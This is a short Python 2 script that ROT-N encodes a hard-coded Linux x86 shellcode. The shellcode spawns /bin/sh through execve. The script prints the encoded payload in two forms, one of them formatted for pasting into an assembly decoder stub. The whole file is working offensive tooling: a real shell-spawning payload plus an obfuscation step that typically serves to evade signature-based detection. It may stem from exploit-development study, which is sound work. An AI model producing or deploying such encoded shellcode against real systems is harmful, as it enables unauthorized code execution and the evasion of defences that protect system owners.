#!/usr/bin/env python
import sys

total = len(sys.argv)

# check for argv
if total != 2:
    print "[+] Usage %s [rot-n]" % sys.argv[0]
    sys.exit()

# convert argv to rot variable and check range consistency
rot = int(sys.argv[1])

if rot not in range(1,257):
     print "[+] Please insert a ROT value between 1 and 256"
     sys.exit()
else:

    shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3"
                 "\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

    n = rot # rot-n
    max_value_without_wrapping = 256 - n

    encoded_shellcode = ""
    db_shellcode = []

    for x in bytearray(shellcode):
        if x < max_value_without_wrapping:
            encoded_shellcode += '\\x%02x' % (x + n)
            db_shellcode.append('0x%02x' % (x + n))
        else:
            encoded_shellcode += '\\x%02x' % (n - 256 + x)
            db_shellcode.append('0x%02x' % (n - 256 + x))

    print "Encoding with \nROT%s\n" % (rot)
    print "Encoded shellcode:\n%s\n" % (encoded_shellcode)
    print "DB formatted (paste in .nasm file):\n%s\n" % ','.join(db_shellcode)
